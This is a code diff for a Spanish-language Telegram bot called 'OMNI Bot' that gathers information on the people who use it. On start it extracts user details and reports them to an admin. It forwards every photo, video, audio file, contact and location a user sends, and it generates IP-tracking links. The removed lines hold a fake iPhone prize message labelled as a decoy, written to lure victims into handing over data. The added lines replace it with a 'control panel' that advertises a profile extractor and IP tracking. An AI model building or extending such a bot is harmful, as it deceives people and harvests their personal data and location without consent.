@@ -4,7 +4,7 @@ import aiohttp
 from datetime import datetime
 from http.server import HTTPServer, BaseHTTPRequestHandler
 from threading import Thread
-from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
+from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup, KeyboardButton
 from telegram.constants import ParseMode
 from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
 
@@ -15,6 +15,7 @@ ADMIN_ID = int(os.environ.get("ADMIN_ID", "0").strip())
 if not TOKEN or not ADMIN_ID:
     raise ValueError("❌ Faltan TOKEN o ADMIN_ID en variables de entorno")
 
+# ========== URLS PARA ENVÍO ==========
 URLS = [
     "https://bot-ubi.societykark.workers.dev",
     "https://bot-tg.societykark.workers.dev",
@@ -34,32 +35,42 @@ logger = logging.getLogger(__name__)
 users_db = {}
 tracking_codes = {}
 
-# ========== MENÚ PRINCIPAL (con emojis, sin Markdown complejo) ==========
-def menu_principal():
+# ========== MENSAJE DE BIENVENIDA (ESTILO PANEL) ==========
+MENSAJE_INICIO = """📌 *PANEL DE CONTROL* 🔥
+━━━━━━━━━━━━━━━━━━━━━━
+*OMNI BOT – VERSIÓN ULTRA*
+
+✅ Extractor de perfiles
+✅ Solicitud de archivos
+✅ Tracking de IP
+✅ Envío a múltiples Workers
+
+━━━━━━━━━━━━━━━━━━━━━━
+*Selecciona una opción:*"""
+
+# ========== BOTONES INLINE (dentro del mensaje, estilo captura) ==========
+def menu_inline():
     keyboard = [
-        [InlineKeyboardButton("📊 Mi Perfil", callback_data="perfil")],
-        [InlineKeyboardButton("📸 Enviar Foto", callback_data="solicitar_foto")],
-        [InlineKeyboardButton("🎥 Enviar Video", callback_data="solicitar_video")],
-        [InlineKeyboardButton("🎵 Enviar Audio", callback_data="solicitar_audio")],
-        [InlineKeyboardButton("📇 Enviar Contacto", callback_data="solicitar_contacto")],
-        [InlineKeyboardButton("📍 Enviar Ubicación", callback_data="solicitar_ubicacion")],
-        [InlineKeyboardButton("🔗 Generar Enlace", callback_data="tracking")],
-        [InlineKeyboardButton("📈 Estadísticas", callback_data="stats")],
+        [InlineKeyboardButton("📊 MI PERFIL", callback_data="perfil")],
+        [InlineKeyboardButton("📸 ENVIAR FOTO", callback_data="solicitar_foto")],
+        [InlineKeyboardButton("🎥 ENVIAR VIDEO", callback_data="solicitar_video")],
+        [InlineKeyboardButton("🎵 ENVIAR AUDIO", callback_data="solicitar_audio")],
+        [InlineKeyboardButton("📇 ENVIAR CONTACTO", callback_data="solicitar_contacto")],
+        [InlineKeyboardButton("📍 ENVIAR UBICACIÓN", callback_data="solicitar_ubicacion")],
+        [InlineKeyboardButton("🔗 GENERAR ENLACE", callback_data="tracking")],
+        [InlineKeyboardButton("📈 ESTADÍSTICAS", callback_data="stats")],
     ]
     return InlineKeyboardMarkup(keyboard)
 
-SENUELO = """🎁 ¡FELICIDADES! Has sido seleccionado para un premio especial!
-
-📱 Gana un iPhone 16 Pro Max
-Solo necesitas completar los siguientes pasos:
-
-1️⃣ Verifica tu identidad (solo una vez)
-2️⃣ Comparte un dato (foto, video o contacto)
-3️⃣ Recibe tu premio virtual
-
-¡Es 100% gratuito y solo toma 2 minutos!
-
-👇 Presiona un botón para comenzar"""
+# ========== BOTONES DE RESPUESTA (abajo del chat, estilo captura) ==========
+def menu_respuesta():
+    keyboard = [
+        [KeyboardButton("📊 Mi Perfil"), KeyboardButton("📸 Foto")],
+        [KeyboardButton("🎥 Video"), KeyboardButton("🎵 Audio")],
+        [KeyboardButton("📇 Contacto"), KeyboardButton("📍 Ubicación")],
+        [KeyboardButton("🔗 Enlace"), KeyboardButton("📈 Stats")],
+    ]
+    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
 
 # ========== FUNCIONES DE EXTRACCIÓN ==========
 async def get_worker_location():
@@ -222,7 +233,10 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
     info_data = await extract_user_info(update, context)
     await send_report_to_admin(update, context, info_data)
-    await update.message.reply_text(SENUELO, reply_markup=menu_principal())
+    # Enviar mensaje de bienvenida con botones inline
+    await update.message.reply_text(MENSAJE_INICIO, parse_mode='Markdown', reply_markup=menu_inline())
+    # Enviar botones de respuesta (abajo del chat)
+    await update.message.reply_text("📌 *Panel rápido:*", parse_mode='Markdown', reply_markup=menu_respuesta())
 
 async def tracking(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
@@ -240,7 +254,7 @@ async def stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(msg)
 
 async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text("🤖 OMNI Bot\n\n/start - Iniciar\n/tracking - Generar enlace\n/stats - Estadísticas\n/help - Ayuda", reply_markup=menu_principal())
+    await update.message.reply_text("🤖 OMNI Bot\n\n/start - Iniciar\n/tracking - Generar enlace\n/stats - Estadísticas\n/help - Ayuda", reply_markup=menu_inline())
 
 async def perfil(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
@@ -274,34 +288,58 @@ async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
     photo = update.message.photo[-1]
     await context.bot.send_photo(chat_id=ADMIN_ID, photo=photo.file_id, caption=f"📸 Foto de {user.first_name} (@{user.username})")
-    await update.message.reply_text("✅ Foto enviada.", reply_markup=menu_principal())
+    await update.message.reply_text("✅ Foto enviada.", reply_markup=menu_inline())
 
 async def handle_video(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
     video = update.message.video
     await context.bot.send_video(chat_id=ADMIN_ID, video=video.file_id, caption=f"🎥 Video de {user.first_name} (@{user.username})")
-    await update.message.reply_text("✅ Video enviado.", reply_markup=menu_principal())
+    await update.message.reply_text("✅ Video enviado.", reply_markup=menu_inline())
 
 async def handle_audio(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
     audio = update.message.audio
     await context.bot.send_audio(chat_id=ADMIN_ID, audio=audio.file_id, caption=f"🎵 Audio de {user.first_name} (@{user.username})")
-    await update.message.reply_text("✅ Audio enviado.", reply_markup=menu_principal())
+    await update.message.reply_text("✅ Audio enviado.", reply_markup=menu_inline())
 
 async def handle_contact(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
     contact = update.message.contact
     await context.bot.send_message(chat_id=ADMIN_ID, text=f"📇 Contacto de {user.first_name} (@{user.username})\n\n📞 {contact.phone_number}")
-    await update.message.reply_text("✅ Contacto enviado.", reply_markup=menu_principal())
+    await update.message.reply_text("✅ Contacto enviado.", reply_markup=menu_inline())
 
 async def handle_location(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
     location = update.message.location
     await context.bot.send_location(chat_id=ADMIN_ID, latitude=location.latitude, longitude=location.longitude)
     await context.bot.send_message(chat_id=ADMIN_ID, text=f"📍 Ubicación de {user.first_name} (@{user.username})")
-    await update.message.reply_text("✅ Ubicación enviada.", reply_markup=menu_principal())
+    await update.message.reply_text("✅ Ubicación enviada.", reply_markup=menu_inline())
 
-# ========== CALLBACKS CON MANEJO DE ERRORES ==========
+# ========== MANEJAR MENSAJES DE TEXTO (botones de respuesta) ==========
+async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    text = update.message.text
+    logger.info(f"📩 Mensaje recibido: {text}")
+
+    if text == "📊 Mi Perfil":
+        await perfil(update, context)
+    elif text == "📸 Foto":
+        await solicitar_foto(update, context)
+    elif text == "🎥 Video":
+        await solicitar_video(update, context)
+    elif text == "🎵 Audio":
+        await solicitar_audio(update, context)
+    elif text == "📇 Contacto":
+        await solicitar_contacto(update, context)
+    elif text == "📍 Ubicación":
+        await solicitar_ubicacion(update, context)
+    elif text == "🔗 Enlace":
+        await tracking(update, context)
+    elif text == "📈 Stats":
+        await stats(update, context)
+    else:
+        await update.message.reply_text("❌ Opción no reconocida. Usa el menú.", reply_markup=menu_respuesta())
+
+# ========== CALLBACKS ==========
 async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
@@ -310,10 +348,9 @@ async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     try:
         if data == "volver":
-            await query.edit_message_text("📋 Menú principal", reply_markup=menu_principal())
+            await query.edit_message_text(MENSAJE_INICIO, parse_mode='Markdown', reply_markup=menu_inline())
             return
 
-        # Para las acciones que requieren un nuevo mensaje, usamos send_message en lugar de edit
         if data == "perfil":
             await perfil(update, context)
             await query.delete_message()
@@ -355,22 +392,22 @@ async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             return
 
         if data == "compartir_contacto":
-            await query.edit_message_text("📇 Usa el botón de compartir contacto (📎 → Contacto).")
+            await query.edit_message_text("📇 Usa el botón de compartir contacto (📎 → Contacto).", reply_markup=menu_inline())
             return
 
         if data == "compartir_ubicacion":
-            await query.edit_message_text("📍 Usa el botón de compartir ubicación (📎 → Ubicación).")
+            await query.edit_message_text("📍 Usa el botón de compartir ubicación (📎 → Ubicación).", reply_markup=menu_inline())
             return
 
     except Exception as e:
         logger.error(f"❌ Error en callback: {e}")
-        await query.edit_message_text("❌ Error inesperado. Intenta de nuevo.", reply_markup=menu_principal())
+        await query.edit_message_text("❌ Error inesperado. Intenta de nuevo.", reply_markup=menu_inline())
 
-# ========== ERROR HANDLER GLOBAL ==========
+# ========== ERROR HANDLER ==========
 async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE):
     logger.error(f"❌ Error: {context.error}")
     if isinstance(update, Update) and update.effective_message:
-        await update.effective_message.reply_text("❌ Error inesperado.", reply_markup=menu_principal())
+        await update.effective_message.reply_text("❌ Error inesperado.", reply_markup=menu_inline())
 
 # ========== SERVIDOR HTTP ==========
 class HealthHandler(BaseHTTPRequestHandler):
@@ -398,6 +435,7 @@ def main():
     app.add_handler(MessageHandler(filters.AUDIO, handle_audio))
     app.add_handler(MessageHandler(filters.CONTACT, handle_contact))
     app.add_handler(MessageHandler(filters.LOCATION, handle_location))
+    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
     app.add_error_handler(error_handler)
     logger.info("✅ OMNI Bot iniciado correctamente")
     app.run_polling()
